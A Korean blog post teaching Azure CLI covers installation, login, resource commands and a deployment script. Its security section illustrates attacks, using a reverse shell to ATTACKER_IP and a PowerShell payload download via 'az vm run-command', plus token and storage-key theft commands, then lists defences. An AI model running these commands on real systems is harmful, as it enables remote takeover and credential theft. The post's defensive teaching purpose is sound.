---
layout: post
title: "Azure CLI"
date: 2025-09-04 17:00:00 +0900
categories: [cloud-azure]
---

## 1. 개요

**Azure CLI**는 Azure 리소스를 생성하고 관리하기 위한 크로스 플랫폼 명령줄 도구이다.
Python 기반으로 작성되어 Windows, macOS, Linux 등 모든 환경에서 동일한 명령어로 동작하며, 쉘 스크립트와 결합하여 인프라 배포를 자동화하는 데 최적화되어 있다.

### 핵심 역할
1.  **리소스 관리**: 포털에 접속하지 않고도 터미널에서 VM 생성, 네트워크 설정, 데이터베이스 관리 등 모든 작업을 수행한다.
2.  **자동화**: Bash나 PowerShell 스크립트에 포함하여 반복적인 작업을 자동화하고 휴먼 에러를 방지한다.
3.  **DevOps 통합**: GitHub Actions, Jenkins 같은 CI/CD 파이프라인에서 인프라를 배포하는 핵심 도구로 사용된다.

### 관리 도구 비교
| 도구 | 장점 | 단점 | 권장 대상 |
|---|---|---|---|
| **Azure Portal** | 직관적인 GUI, 학습 곡선 낮음 | 반복 작업이 번거롭고 느림 | 초보자, 단순 모니터링 |
| **Azure CLI** | **간결한 명령어**, 스크립팅 용이, 빠름 | 명령어 학습 필요 | **운영자, DevOps 엔지니어** |
| **PowerShell** | Windows 환경 및 객체 지향 처리 강력 | Linux/Mac 호환성(Core 버전 필요) | Windows 관리자 |
| **Terraform/Bicep** | 코드형 인프라(IaC), 상태 관리 가능 | 러닝 커브 높음, 선언적 방식 | 대규모 인프라 관리 |

---

## 2. 설치 및 로그인

### 설치 방법
운영체제별 패키지 관리자를 통해 쉽게 설치할 수 있다.

**Windows (Winget)**
```powershell
winget install Microsoft.AzureCLI
```

**macOS (Homebrew)**
```bash
brew install azure-cli
```

**Linux (Curl)**
```bash
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

### 로그인

**1. 대화형 로그인 (브라우저 사용)**
```bash
az login
# 브라우저가 열리면 계정 로그인
```

**2. 서비스 주체 로그인 (자동화용)**
CI/CD 파이프라인 등에서 무인 로그인을 할 때 사용한다.
```bash
az login --service-principal \
  --username <AppID> \
  --password <Password> \
  --tenant <TenantID>
```

**3. 구독 선택**
로그인 후 작업할 구독을 올바르게 설정하는 것이 중요하다.
```bash
# 구독 목록 조회
az account list --output table

# 특정 구독 활성화
az account set --subscription "MySubscriptionName"
```

---

## 3. 핵심 명령어

자주 사용하는 리소스별 기본 명령어 패턴이다. 대부분 `az [서비스] [동작]` 형태를 띈다.

### 리소스 그룹
```bash
# 생성
az group create --name MyRG --location koreacentral

# 조회 (테이블 형식)
az group list --output table

# 삭제 (비동기, 묻지 않고 삭제)
az group delete --name MyRG --yes --no-wait
```

### 네트워크
```bash
# 가상 네트워크 생성
az network vnet create \
  --resource-group MyRG \
  --name MyVNet \
  --address-prefixes 10.0.0.0/16

# 서브넷 추가
az network vnet subnet create \
  --resource-group MyRG \
  --vnet-name MyVNet \
  --name WebSubnet \
  --address-prefixes 10.0.1.0/24
```

### 가상 머신
```bash
# Ubuntu VM 생성 (SSH 키 자동 생성)
az vm create \
  --resource-group MyRG \
  --name MyWebVM \
  --image Ubuntu2204 \
  --size Standard_B2s \
  --admin-username azureuser \
  --generate-ssh-keys \
  --vnet-name MyVNet \
  --subnet WebSubnet

# 전원 관리
az vm start -g MyRG -n MyWebVM
az vm stop -g MyRG -n MyWebVM
az vm deallocate -g MyRG -n MyWebVM  # 과금 중지
```

---

## 4. 실습: 전체 인프라 배포 자동화 스크립트

변수를 활용하여 리소스 그룹부터 VM까지 한 번에 배포하는 Bash 스크립트 예제이다.

```bash
#!/bin/bash

# 1. 변수 정의
RG="AutoInfra-RG"
LOC="koreacentral"
VNET="AutoVNet"
VM="AutoVM"

# 2. 리소스 그룹 생성
echo "Creating Resource Group..."
az group create -n $RG -l $LOC

# 3. 네트워크 구성 (VNet + Subnet)
echo "Creating Network..."
az network vnet create -g $RG -n $VNET --address-prefixes 10.0.0.0/16
az network vnet subnet create -g $RG --vnet-name $VNET -n WebSubnet --address-prefixes 10.0.1.0/24

# 4. 보안 그룹 (NSG) 및 규칙 생성
echo "Creating Security Rules..."
az network nsg create -g $RG -n Web-NSG
az network nsg rule create -g $RG --nsg-name Web-NSG -n AllowHTTP \
    --priority 100 --destination-port-ranges 80 443 --protocol TCP --access Allow

# 5. 공인 IP 생성
az network public-ip create -g $RG -n Web-PIP --sku Standard

# 6. VM 생성 (NIC 자동 생성 및 NSG 연결)
echo "Creating Virtual Machine..."
az vm create -g $RG -n $VM \
    --image Ubuntu2204 --size Standard_B1s \
    --vnet-name $VNET --subnet WebSubnet \
    --nsg Web-NSG --public-ip-address Web-PIP \
    --admin-username azureuser --generate-ssh-keys

echo "배포가 완료되었습니다!"
```

---

## 5. 보안 고려사항

Azure CLI는 강력한 관리 도구인 만큼, 공격자에게도 매력적인 무기가 된다. 탈취된 자격 증명이나 과도한 권한을 가진 서비스 주체는 전체 구독을 장악하는 데 악용될 수 있다.

### 공격 기법 1: Run Command를 이용한 원격 코드 실행

`az vm run-command invoke`는 VM 에이전트를 통해 **OS 수준의 명령을 원격 실행**하는 기능이다. VM에 SSH/RDP 접근 없이도 명령을 수행할 수 있어, 공격자가 Azure 권한만 탈취하면 내부 시스템을 직접 조작할 수 있다.

```bash
# 피해자 VM에서 리버스 쉘 실행 (Linux)
az vm run-command invoke \
  -g TargetRG -n VictimVM \
  --command-id RunShellScript \
  --scripts "bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1"

# Windows에서 PowerShell 실행
az vm run-command invoke \
  -g TargetRG -n VictimVM \
  --command-id RunPowerShellScript \
  --scripts "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')"
```

### 공격 기법 2: 자격 증명 및 메타데이터 탈취

*   **Access Token 탈취**: `az account get-access-token` 명령으로 현재 로그인된 세션의 Bearer 토큰을 추출하여 다른 환경에서 재사용할 수 있다.
*   **IMDS (Instance Metadata Service)**: VM 내부에서 `http://169.254.169.254/metadata/identity/oauth2/token`에 접근하면 Managed Identity의 토큰을 획득할 수 있다.
*   **Custom Data / User Data**: VM 생성 시 주입된 `cloud-init` 스크립트에는 종종 비밀번호나 API 키가 평문으로 저장되어 있다.

```bash
# 현재 세션의 Access Token 추출
az account get-access-token --query accessToken -o tsv

# VM 내부에서 Managed Identity 토큰 획득
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 공격 기법 3: 권한 열거 및 횡이동

```bash
# 접근 가능한 리소스 그룹 열거
az group list -o table

# 구독 내 모든 VM 목록 조회
az vm list --query "[].{Name:name, RG:resourceGroup}" -o table

# Storage Account Key 탈취 (데이터 유출)
az storage account keys list -g TargetRG -n targetsa --query "[0].value" -o tsv
```

### 방어 대책

1.  **최소 권한 원칙 (RBAC)**: 사용자와 서비스 주체에게 필요한 최소한의 권한만 부여한다. `Contributor` 대신 `Reader + 특정 작업` 조합을 사용한다.
2.  **조건부 액세스 (Conditional Access)**: 신뢰할 수 있는 위치나 디바이스에서만 Azure Portal/CLI 접근을 허용한다.
3.  **Run Command 비활성화**: 불필요한 경우 VM의 Guest Agent를 비활성화하거나, Azure Policy로 `Microsoft.Compute/virtualMachines/runCommand/action`을 차단한다.
4.  **활동 로그 모니터링**: Azure Activity Log와 Sentinel에서 `Run Command` 호출이나 비정상적인 `az login` 시도를 탐지하는 규칙을 설정한다.

---

## 6. 트러블슈팅

### 유용한 옵션
*   `--output` (`-o`): 출력 형식을 지정한다.
    *   `-o table`: 보기 편한 표 형식 (사람용)
    *   `-o json`: 상세 정보 확인 또는 프로그래밍 파싱용 (기계용)
    *   `-o tsv`: 탭 구분 텍스트 (변수 할당용)
*   `--query`: JSON 출력에서 특정 필드만 추출한다. (JMESPath 문법)
    *   예: `az vm list -o json --query "[].{Name:name, IP:publicIps}"`
*   `--help` (`-h`): 명령어 사용법과 예제를 보여준다.

### 인터랙티브 모드
명령어가 기억나지 않을 때 자동 완성 기능을 제공하는 대화형 쉘을 실행한다.
```bash
az interactive
```

### 디버깅
명령어가 실패할 때 상세한 HTTP 요청/응답 로그를 확인하려면 `--debug` 옵션을 추가한다.
```bash
az group create -n MyRG -l korea --debug
```

![Azure CLI 실행 결과](/assets/images/cloud-azure/AZURECLI.png)

<hr class="short-rule">
